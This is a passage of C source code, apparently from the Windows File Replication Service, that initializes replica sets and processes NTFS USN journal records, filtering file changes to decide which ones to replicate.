 the NTFS Journal
    subsystem.

Arguments:

    None.

Thread Return Value:

    Win32 status


--*/
{
#undef DEBSUB
#define DEBSUB  "JournalMonitorShutdown:"

    ULONG WStatus;
    JET_ERR jerr;
    ULONG i;

    DPRINT1(3, ":S: <<<<<<<...E N T E R I N G -- %s...>>>>>>>>\n", DEBSUB);
    //
    // Stop the Change Order Accept thread.
    //
    ChgOrdAcceptShutdown();

    //
    // Locks for the Filter Table Child Lists.
    //
    for (i=0; i<NUMBER_FILTER_TABLE_CHILD_LOCKS; i++) {
        DeleteCriticalSection(&JrnlFilterTableChildLock[i]);
    }

}



ULONG
JrnlInitOneReplicaSet(
    PCOMMAND_PACKET CmdPkt
    )
/*++

Routine Description:

    This routine does all the journal and database initialization for a
    single replica set.  It is used to startup a replica set that failed
    to start at service startup or to start a newly created replica set.

    Note the Journal and database subsystems must be initialized first.

    The Replica arg must have an initialized config record.

    Warning - There are no table level locks on the Filter table so only
    one replica set can be initialized at a time on a single volume.
    Actually this might work since the row locks and child link locks should
    be sufficient but it hasn't been tested.

    The second part of the initialization is done by the database server so
    the journal thread is free to finish processing any pending journal
    buffers for this volume since we have to pause it before we can update
    the filter table.

Arguments:

    CmdPkt - ptr to a cmd packet with a ptr to a replica struct with a
             pre-initialized config record.

Thread Return Value:

    Frs Error Status

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlInitOneReplicaSet:"

    ULONG                   FStatus;
    ULONG                   WStatus;
    PCONFIG_TABLE_RECORD    ConfigRecord;
    PREPLICA_THREAD_CTX     RtCtx;
    PREPLICA                Replica;

    //
    // Check that the journal subsystem is up.
    //
    if (!HANDLE_IS_VALID(JournalReadThreadHandle)) {
        return FrsErrorNotInitialized;
    }

    Replica = CmdPkt->Parameters.JournalRequest.Replica;

    //
    // Phase 1 of journal monitor init.  This opens the USN journal on the volume
    // containing the replica set. It allocates the:
    //  - volume filter hash table,
    //  - parent file ID table,
    //  - USN record file name dependency hash table,
    //  - USN Write Filter Table,
    //  - Active Child dependency hash table,
    //  - volume change order list,
    //  - volume Change Order Aging table hash table and the
    //  - Active Inbound Change Order hash table.
    //
    // If the journal is already open then it returns the pVme for the volume
    // in the Replica struct.
    //
    DPRINT3(4, ":S: Phase 1 for replica %ws, id: %d, (%08x)\n",
            Replica->ReplicaName->Name, Replica->ReplicaNumber, Replica);

    //
    // Assume its going to work out ok and go do it.
    //
    Replica->FStatus = FrsErrorSuccess;
    WStatus = JrnlPrepareService1(Replica);

    if (!WIN_SUCCESS(WStatus) || (Replica->pVme == NULL)) {
        DPRINT1_WS(4, "++ Phase 1 for replica %ws Failed;",
                   Replica->ReplicaName->Name, WStatus);

        //
        // add cleanup code, delete vme ...
        //
        if (FRS_SUCCESS(Replica->FStatus)) {
            //
            // Return generic error if no specific error code was provided.
            //
            Replica->FStatus = FrsErrorReplicaPhase1Failed;
        }
        return Replica->FStatus;
    }


    ConfigRecord = (PCONFIG_TABLE_RECORD) (Replica->ConfigTable.pDataRecord);

    //
    // ** WARN ** at this point there is only one Replica Thread
    // context associated with the replica.
    //
    RtCtx = CONTAINING_RECORD(GetListHead(&Replica->ReplicaCtxListHead.ListHead),
                              REPLICA_THREAD_CTX,
                              ReplicaCtxList);

    DPRINT3(4, "++ Submit replica tree load cmd for replica %ws, id: %d, (%08x)\n",
            Replica->ReplicaName->Name, Replica->ReplicaNumber, Replica);

    DPRINT3(4, "++ ConfigRecord: %08x,  RtCtx: %08x, path: %ws\n",
            ConfigRecord, RtCtx, ConfigRecord->FSRootPath);

    //
    // Propagate the command packet on to the DBService to init the
    // replica tables and complete the rest of the initialization.
    //
     DbsPrepareCmdPkt(CmdPkt,              //  CmdPkt,
                      Replica,             //  Replica,
                      CMD_LOAD_ONE_REPLICA_FILE_TREE, // CmdRequest,
                      NULL,                //  TableCtx,
                      RtCtx,               //  CallContext,
                      0,                   //  TableType,
                      0,                   //  AccessRequest,
                      0,                   //  IndexType,
                      NULL,                //  KeyValue,
                      0,                   //  KeyValueLength,
                      TRUE);               //  Submit

    //
    // Phase 1 is done.
    //

    return FrsErrorSuccess;

}



ULONG_PTR
JrnlFilterDeleteEntry (
    PGENERIC_HASH_TABLE Table,
    PVOID Buffer,
    PVOID Context
    )
/*++

Routine Description:

    This function is called thru GhtCleanTableByFilter() to delete all the
    Filter table entries for a given Replica Set specified by the
    Context parameter.

Arguments:

    Table - the hash table being enumerated (to lookup parent entry).
    Buffer - a ptr to a FILTER_TABLE_ENTRY
    Context - A pointer to the Replica struct for the replica data added to the
              table.

Return Value:

    True if the entry matches the Replica Context and is to be deleted.

--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlFilterDeleteEntry:"

    PREPLICA Replica = (PREPLICA) Context;
    PFILTER_TABLE_ENTRY FilterEntry = Buffer;

    return (FilterEntry->Replica == Replica);
}



ULONG
JrnlCleanOutReplicaSet(
    PREPLICA Replica
    )
/*++

Routine Description:

    This routine cleans out the filter table and parent file ID table entries
    associated with the given replica set.

    *NOTE* We assume the caller has paused the journal and there is no
    activity on either the volume FilterTable or the ParentFidTable.

    Warning - There are no table level locks on the Filter table so only
    one replica set can be cleaned up t a time on a single volume.

Arguments:

    Replica - ptr to replica struct.

Thread Return Value:

    Frs Error Status

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlCleanOutReplicaSet:"

    PVOLUME_MONITOR_ENTRY  pVme = Replica->pVme;
    ULONG Cnt;

    //
    // Check that the journal subsystem is up.
    //
    if (!HANDLE_IS_VALID(JournalReadThreadHandle)) {
        return FrsErrorNotInitialized;
    }

    //
    // Scan the table and delete all the filter entries for this replica set.
    //
    Cnt = GhtCleanTableByFilter(pVme->FilterTable, JrnlFilterDeleteEntry, Replica);
    DPRINT1(4, "Total of %d Filter Table entries deleted.\n", Cnt);

    //
    // Ditto for the parent file ID table.
    //
    QHashDeleteByFlags(pVme->ParentFidTable, Replica->ReplicaNumber);

    //
    // Note: we could also do this for the name space table by moving the
    //       sequence number into the quadword and putting the replica number
    //       in flags

    return FrsErrorSuccess;
}


DWORD
WINAPI
Monitor(
    PFRS_THREAD  ThisFrsThreadCtx
    )

/*++

Routine Description:

    This is the main journal work thread.  It processes command packets
    and journal buffer packets off its processing queue.

    It filters each entry in the USN journal against a filter table for
    the volume to determine if the file in question is part of a replica
    set.  It then builds a change order entry to feed the data base and
    the output logs.

    Note: Perf:  If multiple volumes are being monitored, we could create
           additional monitor threads and divide the volumes up among the
           threads.  The processing of USN records for a given volume is
           single threaded though because they must be processed in order.

Arguments:

    ThisFrsThreadCtx - A pointer to the FRS_THREAD ctx for this thread.

Thread Return Value:

    ERROR_SUCCESS - Thread terminated normally.
    Other errors from CreatFile, ReadDirectoryChangesW, CreateEvent, ...
    are returned as the thread exit status.

--*/
{
#undef DEBSUB
#define DEBSUB  "monitor:"


    USN         CurrentUsn;
    USN         NextUsn;
    USN         JournalConsumed;
    ULONGLONG   CaptureParentFileID;

    PWCHAR      Pwc;
    DWORD       Level;
    ULONG       RelativePathLength;

    ULONG       FileAttributes;

    LONG        DataLength;
    PUSN_RECORD UsnRecord;
    PUSN_RECORD OldRenUsnRec;
    PULONGLONG  UsnBuffer;
    BOOL        SaveFlag;

    PLIST_ENTRY Entry;
    PJBUFFER    Jbuff;

    NTSTATUS    Status;
    ULONG       WStatus = ERROR_SUCCESS;
    ULONG       GStatus;
    ULONG       FStatus;

    PVOLUME_MONITOR_ENTRY  pVme;
    PFRS_NODE_HEADER       Header;
    PCONFIG_TABLE_RECORD   ConfigRecord;
    PCOMMAND_PACKET        CmdPkt;
    PREPLICA       Replica;
    BOOL           Excluded;
    UNICODE_STRING TempUStr;

    BOOL  IsDirectory;
    ULONG UsnReason;
    ULONG Flags;
    LONG  LocationCmd;
    PFILTER_TABLE_ENTRY  PrevParentFilterEntry;
    PFILTER_TABLE_ENTRY  CurrParentFilterEntry;
    PCXTION              Cxtion;
    WCHAR FileName[MAX_PATH + 1];
    PrevParentFilterEntry = NULL;
    CurrParentFilterEntry = NULL;


/******************************************************************************
*******************************************************************************
**                                                                           **
**                                                                           **
**         M A I N   U S N   J O U R N A L   P R O C E S S   L O O P         **
**                                                                           **
**                                                                           **
*******************************************************************************
******************************************************************************/


    DPRINT(5, ":S: Journal is starting.\n");

    //
    // Try-Finally
    //
    try {

    //
    // Capture exception.
    //
    try {

    while (TRUE) {
        //
        // Wait on the JournalProcessQueue for a journal buffer.
        //
        Entry = FrsRtlRemoveHeadQueueTimeout(&JournalProcessQueue, 10*1000);
        if (Entry == NULL) {
            WStatus = GetLastError();
            if (WStatus == WAIT_TIMEOUT) {
                //
                // Go look for more work.
                //
                continue;
            }

            if (WStatus == ERROR_INVALID_HANDLE) {
                DPRINT(4, ":S: JournalProcessQueue is shutdown.\n");
                //
                // The queue has been run down. Close all the journal handles
                // saving the USN to start the next read from.  Then close
                // Jet Session and exit.
                //
                    WStatus = ERROR_SUCCESS;
                    JrnlCloseAll();
                    break;
            }
            //
            // Unexpected error from FrsRtlRemoveHeadQueueTimeout
            //
            DPRINT_WS(0, "Error from FrsRtlRemoveHeadQueueTimeout", WStatus);
            JrnlCloseAll();
            break;
        }

        Header = (PFRS_NODE_HEADER) CONTAINING_RECORD(Entry, COMMAND_PACKET, ListEntry);
        if (Header->Type == COMMAND_PACKET_TYPE) {
            //
            // Process the command packet.
            //
            WStatus = JrnlCommand((PCOMMAND_PACKET)Header);
            continue;
        }


        if (Header->Type != JBUFFER_TYPE) {
            //
            // Garbage packet.
            //
            DPRINT2(0, "ERROR - Invalid packet type: %d, size: %d\n",
                    Header->Type, Header->Size);
            FRS_ASSERT(!"Jrnl monitor: Invalid packet type");
        }

        ///////////////////////////////////////////////////////////////////
        //                                                               //
        //     P R O C E S S   J O U R N A L   D A T A   B U F F E R     //
        //                                                               //
        ///////////////////////////////////////////////////////////////////

        //
        // Increment the Usn Reads Counter
        //
        PM_INC_CTR_SERVICE(PMTotalInst, UsnReads, 1);

        Jbuff = CONTAINING_RECORD(Entry, JBUFFER, ListEntry);
        //DPRINT2(5, "jb:                         fu %08x (len: %d)\n",
        //        Jbuff, Jbuff->DataLength);

        pVme = Jbuff->pVme;
        WStatus = Jbuff->WStatus;
        UsnBuffer = Jbuff->DataBuffer;
        DataLength = Jbuff->DataLength;

        DPRINT1(4, ":U: ***** USN Data for Volume %ws *****\n", pVme->FSVolInfo.VolumeLabel);

        //
        // Pull out the Next USN
        //
        NextUsn = 0;
        if (DataLength != 0) {
            UsnRecord = (PUSN_RECORD)((PCHAR)UsnBuffer + sizeof(USN));
            DataLength -= sizeof(USN);

            NextUsn = *(USN *)UsnBuffer;
            DPRINT1(4, "Next Usn will be: %08lx %08lx\n", PRINTQUAD(NextUsn));
        }

        //
        // Check if I/O is stopped on this journal and throw the buffer away.
        // Could be a pause request.
        //
        if (!pVme->IoActive) {
            CAPTURE_JOURNAL_PROGRESS(pVme, Jbuff->JrnlReadPoint);
            DPRINT1(4, "++ I/O not active on this journal.  Freeing buffer. State is: %s\n",
                      RSS_NAME(pVme->JournalState));
            //DPRINT1(5, "jb: tf %08x\n", Jbuff);
            FrsRtlInsertTailQueue(&JournalFreeQueue, &Jbuff->ListEntry);
            continue;
        }


        //
        // Check for lost journal data.  This is unlikely to happen here since
        // this error will surface when we submit the journal read request.
        // There is other error recovery code that is invoked when we try to start
        // a replica set and the journal restart point is not found.
        //
        if (WStatus == ERROR_NOT_FOUND) {
            DPRINT1(4, ":U: Usn %08lx %08lx has been deleted.  Data lost, resync required\n",
                    PRINTQUAD(Jbuff->JrnlReadPoint));

            //DPRINT1(5, "jb: tf %08x\n", Jbuff);
            FrsRtlInsertTailQueue(&JournalFreeQueue, &Jbuff->ListEntry);

            //
            // Post an error log entry.
            //
            EPRINT1(EVENT_FRS_IN_ERROR_STATE, JetPath);
        }

        //
        // Some other error.
        //
        if (!WIN_SUCCESS(WStatus)) {
            DPRINT_WS(0, "ERROR - Read Usn Journal failed", WStatus);
            //
            // Put the VME on the stop queue and mark all Replica Sets
            // using this VME as stopped.
            //
            // Add code to walk the replica list to stop replication on a journal error.
            // Is closing the journal the right way to fail?
            //
            JrnlClose(Jbuff->FileHandle);

            CAPTURE_JOURNAL_PROGRESS(pVme, Jbuff->JrnlReadPoint);

            //DPRINT1(5, "jb: tf %08x\n", Jbuff);
            FrsRtlInsertTailQueue(&JournalFreeQueue, &Jbuff->ListEntry);
            continue;
        }


        //
        // Check for data left after USN.
        //
        if (DataLength > 0) {
            //
            // Check version number for mismatch.
            //
            if (UsnRecord->MajorVersion != ConfigUsnMajorVersion) {
                DPRINT2(0, ":U: ERROR - Major version mismatch for USN Journal.  Found: %d, Expected: %d\n",
                        UsnRecord->MajorVersion, ConfigUsnMajorVersion);
                WStatus = ERROR_REVISION_MISMATCH;
                //
                // Put the VME on the stop queue and mark all Replica Sets
                // using this VME as stopped.
                //
                // Note: Add code to walk the replica list & stop VME on config mismatch.
                //       is closing the journal the right way to fail?
                //
                JrnlClose(Jbuff->FileHandle);
                CAPTURE_JOURNAL_PROGRESS(pVme, Jbuff->JrnlReadPoint);

                //DPRINT1(5, "jb: tf %08x\n", Jbuff);
                FrsRtlInsertTailQueue(&JournalFreeQueue, &Jbuff->ListEntry);
                continue;
            }
        }

        //
        // The USN save point for each replica can also depend on the amount of
        // journal data consumed.  If there is lots of activity on the journal
        // but little or no activity on a given replica set hosted by the volume
        // then we must keep advancing the USN save point for the replica.
        // Otherwise, if we were to crash we could find ourselves with a USN
        // save point at recovery for data no longer in the journal that we
        // don't want anyway.  In addition, if it was still in the journal we
        // would have to plow through it a second time just to find nothing of
        // interest.  Once JRNL_USN_SAVE_POINT_INTERVAL bytes of journal data
        // are consumed then trigger a USN save on all active replica sets on
        // this volume.  A journal replay could make this go negative so
        // minimize with 0.
        //
        SaveFlag = FALSE;
        LOCK_VME(pVme);     // Get the lock to avoid QW Tearing with
                            // LastUsnSavePoint update in NEW_VSN() code.
        JournalConsumed = NextUsn - pVme->LastUsnSavePoint;
        if (JournalConsumed < 0) {JournalConsumed = (USN)0;}
        if (JournalConsumed >= (USN) JRNL_USN_SAVE_POINT_INTERVAL) {
            SaveFlag = TRUE;
            DPRINT3(5, "++ USN Save Triggered: NextUsn: %08x %08x  "
                                           "LastSave: %08x %08x  "
                                           "Consumed: %08x %08x\n",
                    PRINTQUAD(NextUsn),
                    PRINTQUAD(pVme->LastUsnSavePoint),
                    PRINTQUAD(JournalConsumed));
            pVme->LastUsnSavePoint = NextUsn;
        }
        UNLOCK_VME(pVme);
        if (SaveFlag) {
            DbsRequestSaveMark(pVme, FALSE);
        }

        ///////////////////////////////////////////////////////////////////
        //                                                               //
        //             P R O C E S S   U S N   R E C O R D S             //
        //                                                               //
        ///////////////////////////////////////////////////////////////////

        //
        // Walk through the buffer and process the results.  Note that a single
        // file can appear multiple times.  E.G. a copy operation to a file may
        // create the target update the create time and set the attributes.
        // Each one of these is reported as a separate event.
        //

        RESET_JOURNAL_PROGRESS(pVme);

        while (DataLength > 0) {

            Replica = NULL;

            if ((LONG)UsnRecord->RecordLength > DataLength) {
                DPRINT2(0, ":U: ERROR: Bogus DataLength: %d, Record Length Was: %d\n",
                        DataLength, UsnRecord->RecordLength );
                break;
            }

            //
            // Track USN of current record being processed and the maximum
            // point of progress reached in the journal.
            //
            CurrentUsn = UsnRecord->Usn;

            pVme->CurrentUsnRecord = CurrentUsn;
            CAPTURE_MAX_JOURNAL_PROGRESS(pVme, CurrentUsn);

            //
            // Check if I/O is stopped on this journal and skip the rest of the
            // buffer.  Could be a pause request. Capture current journal
            // progress for an unpause.
            //
            if (!pVme->IoActive) {
                CAPTURE_JOURNAL_PROGRESS(pVme, CurrentUsn);
                DPRINT1(4, ":U: I/O not active on this journal.  Freeing buffer. State is: %s\n",
                          RSS_NAME(pVme->JournalState));
                UpdateCurrentUsnRecordDone(pVme, CurrentUsn);
                break;
            }

            //
            // Increment the UsnRecordsExamined counter
            //
            PM_INC_CTR_SERVICE(PMTotalInst, UsnRecExamined, 1);


            if (CurrentUsn == QUADZERO) {
                DUMP_USN_RECORD(3, UsnRecord);
                DPRINT(3, "++ Zero USN; skipping\n");
                UpdateCurrentUsnRecordDone(pVme, CurrentUsn);
                PM_INC_CTR_SERVICE(PMTotalInst, UsnRecRejected, 1);
                goto NEXT_USN_RECORD;
            }

            UsnReason = UsnRecord->Reason;
            FileAttributes = UsnRecord->FileAttributes;


            //
            // If this is close record with a file name of the form
            // "NTFRS_DELETED_FILE_xxxxxx" then delete the file.  These are
            // produced when an install override is performed by renaming an
            // open target file to the above name in order to complete an install.
            //
            if ((UsnRecord->FileNameLength/sizeof(WCHAR) > wcslen(INSTALL_OVERRIDE_PREFIX)) &&
                (wcsncmp(UsnRecord->FileName,
                         INSTALL_OVERRIDE_PREFIX,
                         wcslen(INSTALL_OVERRIDE_PREFIX)) == 0)) {

                if (BooleanFlagOn(UsnReason, USN_REASON_CLOSE)) {
                    DUMP_USN_RECORD(3, UsnRecord);

                    if (!BooleanFlagOn(UsnReason, USN_REASON_FILE_DELETE) &&
                        ((UsnReason & ~USN_REASON_CLOSE) != 0)) {
                        //
                        // Delete the file.
                        //
                        RtlMoveMemory (FileName, UsnRecord->FileName, UsnRecord->FileNameLength);
                        FileName[UsnRecord->FileNameLength/sizeof(WCHAR)] = UNICODE_NULL;

                        WStatus = FrsDeleteById(pVme->DriveLetter,
                                                FileName,
                                                pVme,
                                                &UsnRecord->FileReferenceNumber,
                                                FILE_ID_LENGTH);
                        DPRINT1_WS(2, "++ WARN - cannot delete %ws;", FileName, WStatus);
                    }

                    DPRINT(3, "++ INSTALL OVERRIDE CLEANUP; skipping\n");
                }

                UpdateCurrentUsnRecordDone(pVme, CurrentUsn);
                PM_INC_CTR_SERVICE(PMTotalInst, UsnRecRejected, 1);
                goto NEXT_USN_RECORD;
            }


            //
            // Ignore temporary, encrypted files.  We do replicate offline
            // files (FILE_ATTRIBUTE_OFFLINE set) because some members
            // may be running HSM and some may not.  All members have to
            // have the same data.
            //
            if (FileAttributes & (FILE_ATTRIBUTE_ENCRYPTED)) {
                DUMP_USN_RECORD(3, UsnRecord);
                DPRINT(3, "++ Encrypted; skipping\n");
                UpdateCurrentUsnRecordDone(pVme, CurrentUsn);
                PM_INC_CTR_SERVICE(PMTotalInst, UsnRecRejected, 1);
                goto NEXT_USN_RECORD;
            }

            //
            // Skip USN records with the SOURCE_DATA_MANAGEMENT flag set.
            // E.G. HSM and SIS would set this flag to prevent triggering
            // replication when the data has not changed.
            //
            if (UsnRecord->SourceInfo & USN_SOURCE_DATA_MANAGEMENT) {
                DUMP_USN_RECORD(3, UsnRecord);
                DPRINT(3, "++ DATA_MANAGEMENT source; skipping\n");
                UpdateCurrentUsnRecordDone(pVme, CurrentUsn);
                PM_INC_CTR_SERVICE(PMTotalInst, UsnRecRejected, 1);
                goto NEXT_USN_RECORD;
            }

            //
            // If this is an USN_REASON_RENAME_OLD_NAME record that does not have
            // USN_REASON_RENAME_NEW_NAME set then capture the old name so
            // we have it when processing the new name.
            //
            if ((UsnReason & USN_REASON_RENAME_OLD_NAME) &&
                ((UsnReason & USN_REASON_RENAME_NEW_NAME) == 0) ) {

                //
                // Always pick up the old name when we see one.  There are times
                // when we will pick up an old name but then filter out the USN
                // record. e.g. not in replica set, a staging file, etc.
                // If we always load the old name then the next Close record
                // with Rename New set will have the correct old name to insert into
                // the name space table.  Since multiple rename records can occur
                // in sequence before we see the first close we need to track
                // multiple RENAME_OLD_NAME records.
                //
                GStatus = QHashLookup(pVme->RenOldNameTable,
                                      &UsnRecord->FileReferenceNumber,
                                      NULL,
                                      (PULONG_PTR) &OldRenUsnRec);

                if (GStatus == GHT_STATUS_SUCCESS ) {
                    //
                    // Existing entry found for this file.  Update it.
                    //
                    if (OldRenUsnRec->RecordLength < UsnRecord->RecordLength) {
                        OldRenUsnRec = FrsFree(OldRenUsnRec);
                        OldRenUsnRec = FrsAlloc(UsnRecord->RecordLength);
                    }

                    if (OldRenUsnRec != NULL) {
                        RtlMoveMemory (OldRenUsnRec, UsnRecord, UsnRecord->RecordLength);
                        DPRINT(3, "++ Rename old. Save name\n");

                        GStatus = QHashUpdate(pVme->RenOldNameTable,
                                              &UsnRecord->FileReferenceNumber,
                                              NULL,
                                              (ULONG_PTR) OldRenUsnRec);
                        if (GStatus != GHT_STATUS_SUCCESS ) {
                            DPRINT1(0, "++ QHashUpdate error: %d\n", GStatus);
                        }

                    } else {
                        DPRINT(0, "++ Rename old. Save name failed -- no memory\n");
                    }

                } else {
                    //
                    // No entry for this file.  Create a new one and save USN record.
                    //
                    OldRenUsnRec = FrsAlloc(UsnRecord->RecordLength);

                    if (OldRenUsnRec != NULL) {
                        RtlMoveMemory (OldRenUsnRec, UsnRecord, UsnRecord->RecordLength);
                        DPRINT(3, "++ Rename old. Save name\n");

                        GStatus = QHashInsert(pVme->RenOldNameTable,
                                              &UsnRecord->FileReferenceNumber,
                                              NULL,
                                              (ULONG_PTR) OldRenUsnRec,
                                              FALSE);
                        if (GStatus != GHT_STATUS_SUCCESS ) {
                            OldRenUsnRec = FrsFree(OldRenUsnRec);
                            DPRINT1(0, "++ QHashInsert error: %d\n", GStatus);
                        }
                    } else {
                        DPRINT(0, "++ Rename old. Save name failed -- no memory\n");
                    }
                }

                DUMP_USN_RECORD(3, UsnRecord);


                UpdateCurrentUsnRecordDone(pVme, CurrentUsn);
                PM_INC_CTR_SERVICE(PMTotalInst, UsnRecRejected, 1);
                goto NEXT_USN_RECORD;
            }

            //
            // FRS uses the NTFS journal filtering feature in which an app can
            // tell NTFS what kinds of journal records it does not want to see.
            // In particular FRS asks NTFS to filter out all journal records
            // except for journal "Close" and "Create" records.  NTFS
            // writes a close record to the journal after the last handle to
            // the file is closed.  In addition, if the system crashes, at
            // startup NTFS recovery-processing inserts close records for all
            // open and modified files.
            // The Create records need to be examined for directory creates
            // because the close record may not appear for a while.  Meanwhile
            // multiple children close records can be processed which would
            // be skipped unless the parent dir create was added to the Filter
            // table.  Bug 432549 was a case of this.
            //
            if (!BooleanFlagOn(UsnReason, USN_REASON_CLOSE)) {

                if (BooleanFlagOn(UsnReason, USN_REASON_FILE_CREATE) &&
                    BooleanFlagOn(FileAttributes, FILE_ATTRIBUTE_DIRECTORY)) {
                    DUMP_USN_RECORD(3, UsnRecord);
                    DPRINT(3, "++ Dir Create; Cannot skip\n");
                } else {
                    DUMP_USN_RECORD(3, UsnRecord);
                    DPRINT(3, "++ Not a close and not dir create; skipping\n");
                    UpdateCurrentUsnRecordDone(pVme, CurrentUsn);
                    PM_INC_CTR_SERVICE(PMTotalInst, UsnRecRejected, 1);
                    goto NEXT_USN_RECORD;
                }
            }

            //
            // Skip files that have USN_REASON_REPARSE_POINT_CHANGE set.
            // Since symbolic links are unsupported we do not replicate them.
            // HSM and SIS also use reparse points but we only replicate changes
            // to the file and these services change the NTFS File Record to set
            // the reparse point attribute only when they migrate the file data
            // somewhere else.  By that time the file had already been created
            // and was replicated when it was created.  See NTIOAPI.H for more
            // info about the REPARSE_DATA_BUFFER and the IO_REPARSE_TAG field.
            //
#if 0
// This below is faulty because the SIS COPY FILE utility will both set and create
// files with a reparse point.  We will have to rely on the data management test
// above to filter out the conversion of a file to and from a SIS link.
            if (UsnReason & USN_REASON_REPARSE_POINT_CHANGE) {
                DUMP_USN_RECORD(3, UsnRecord);
                DPRINT(3, "++ Reparse point change; skipping\n");
                UpdateCurrentUsnRecordDone(pVme, CurrentUsn);
                PM_INC_CTR_SERVICE(PMTotalInst, UsnRecRejected, 1);
                goto NEXT_USN_RECORD;
            }
#endif

            //
            // If this file record has the reparse attribute set then read
            // the Reparse Tag from the file to see if this is either SIS or HSM.
            //
            if (FileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
                //
                // Can't filter out Deletes though
                //
                if (!BooleanFlagOn(UsnReason, USN_REASON_FILE_DELETE)) {
                    WStatus = FrsCheckReparse(L"--",
                                              (PULONG)&UsnRecord->FileReferenceNumber,
                                              FILE_ID_LENGTH,
                                              pVme->VolumeHandle);

                    if (!WIN_SUCCESS(WStatus)) {
                        DUMP_USN_RECORD(3, UsnRecord);
                        DPRINT_WS(3, "++ FrsGetReparseTag failed, skipping,", WStatus);
                        UpdateCurrentUsnRecordDone(pVme, CurrentUsn);
                        PM_INC_CTR_SERVICE(PMTotalInst, UsnRecRejected, 1);
                        goto NEXT_USN_RECORD;
                    }
                }
            }

            ///////////////////////////////////////////////////////////////////
            //                                                               //
            //               F I L T E R   P R O C E S S I N G               //
            //                                                               //
            ///////////////////////////////////////////////////////////////////

            //
            // Note: If replication is paused for the replica tree we still
            // process the journal entries so we don't lose data.
            // When replication is later unpaused the update process picks
            // up the change orders from the Replica Set Change order table.
            //
            // If replication was not started for a given replica tree then
            // the directory fids won't be in the table.  When replication
            // is stopped for a replica tree its directory fids are purged
            // from the table
            //
            // In the case of file or Dir renames the parent FID in the
            // USN record is the FID of the destination of the rename.
            // If the file/dir was in a replica set prior to the rename its
            // parent file ID will be in the Parent File ID table for the
            // volume.
            //
            // Determine if the file is in a replica set and if a location
            // change is involved.  Lookup the previous and current parent FID
            // in the Journal Filter table and return references to their
            // respective filter entries.  From this point forward the flow
            // must go thru SKIP_USN_RECORD so the ref counts on PrevParentFilterEntry
            // and CurrParentFilterEntry are decremented appropriately.
            //
            LocationCmd = JrnlGetFileCoLocationCmd(pVme,
                                                   UsnRecord,
                                                   &PrevParentFilterEntry,
                                                   &CurrParentFilterEntry);

            if (LocationCmd == FILE_NOT_IN_REPLICA_SET) {
                goto SKIP_USN_RECORD;
            }

            //
            // Nothing to do; skip the usn record
            //
            if (LocationCmd == CO_LOCATION_NO_CMD &&
                ((UsnRecord->Reason & CO_CONTENT_MASK) == 0)) {
                DUMP_USN_RECORD(5, UsnRecord);
                DPRINT(5, "++ CO_LOCATION_NO_CMD and no content; skipping\n");
                goto SKIP_USN_RECORD;
            }

            //
            // Filter out creates of files with FILE_ATTRIBUTE_TEMPORARY set.
            //
            if (!(FileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                (FileAttributes & FILE_ATTRIBUTE_TEMPORARY)  &&
                CO_NEW_FILE(LocationCmd)) {
                DUMP_USN_RECORD(5, UsnRecord);
                DPRINT(5, "++ Temporary attribute set on file; skipping\n");
                goto SKIP_USN_RECORD;
            }
            //
            // Determine the Replica and get the Parent File ID.
            //
            if (CurrParentFilterEntry != NULL) {
                CaptureParentFileID = CurrParentFilterEntry->DFileID;
                Replica = CurrParentFilterEntry->Replica;
            } else {
                CaptureParentFileID = PrevParentFilterEntry->DFileID;
                Replica = PrevParentFilterEntry->Replica;
            }

            FRS_ASSERT(Replica != NULL);

            //
            // Under certain conditions a USN record could refer to a file
            // in the FRS PreInstall directory.  In particular this can happen
            // during restart when we have lost our journal write filter.
            // No operation on a pre-install file should cause replication.
            // Make special check here for parent FID match.
            //
            if (UsnRecord->ParentFileReferenceNumber == Replica->PreInstallFid) {
                DUMP_USN_RECORD(5, UsnRecord);
                DPRINT(5, "++ USN Record on PreInstall file; skipping\n");
                goto SKIP_USN_RECORD;
            }


            DUMP_USN_RECORD2(3, UsnRecord, Replica->ReplicaNumber, LocationCmd);
            DPRINT2(4, "++ IN REPLICA %d, %ws \n",
                    Replica->ReplicaNumber, Replica->ReplicaName->Name);

            //
            // Check for stale USN record.  This occurs when a replica tree
            // is reloaded from disk.  In this case you can have stale USN records
            // in the journal that predate the current state of the file when it
            // was loaded.  To handle this we capture the current USN when the
            // replica tree load starts (Ub), and again when the load finishes
            // (Ue).  We save Ub and Ue with the replica config info.  The USN
            // of a record (Ur) affecting this replica tree is then compared
            // with these bounds as follows:  (Uf is current USN on the file).
            //  if Ur < Ub then skip record since the load has the current state.
            //  if Ur > Ue then process record since load has old state.
            //  if Ur > Uf then process record since load has old state.
            //  otherwise skip the record.
            // Only in the last case is it necessary to open the file and read
            // the USN (when Ub <= Ur <= Ue).
            //
            // Note: add code to filter stale USN records after a replica tree load.
            //       This is not a problem if the replica tree starts out empty.


            //
            // If the record USN is less than or equal to LastUsnRecordProcessed for
            // this Replica then we must be doing a replay so ignore it.
            // This works because a given file can only be in one Replica
            // set at a time.

            // NOTE: what about MOVERS?
            //
            // NOTE: Hardlinks across replica sets would violate this.
            //
            if (CurrentUsn <= Replica->LastUsnRecordProcessed) {
                DPRINT(5, "++ USN <= LastUsnRecordProcessed.  Record skipped.\n");
                goto SKIP_USN_RECORD;
            }
            //
            // If this replica set is paused or has encountered an error
            // then skip the record.  When it is restarted we will replay
            // the journal for it.
            //
            if (Replica->ServiceState != REPLICA_STATE_ACTIVE) {
                DPRINT1(5, "++ Replica->ServiceState not active (%s).  Record skipped.\n",
                       RSS_NAME(Replica->ServiceState));
                goto SKIP_USN_RECORD;
            }

            //
            // Get the ptr to the config record for this replica.
            //
            ConfigRecord = Replica->ConfigTable.pDataRecord;


            //
            // The following call builds the path of the file as we currently
            // know it.  If the operation is a MOVEOUT this is the previous path.
            // Since the USN data is historical the file/dir may not be at this
            // location any longer.
            //
            FStatus = JrnlGetPathAndLevel(pVme->FilterTable,
                                          &CaptureParentFileID,
                                          &Level);
            if (!FRS_SUCCESS(FStatus)) {
                goto SKIP_USN_RECORD;
            }

            //
            // Consistency checking.
            //
            if (UsnRecord->FileNameLength > (sizeof(FileName) - sizeof(WCHAR))) {
                DPRINT1(0, ":U: ERROR - USN Record Inconsistency - File path length too long (%d bytes)\n",
                        UsnRecord->FileNameLength);
                DPRINT3(0, ":U: ERROR -  Start of data buf %08x, current ptr %08x, diff %d\n",
                            Jbuff->DataBuffer,  UsnRecord,
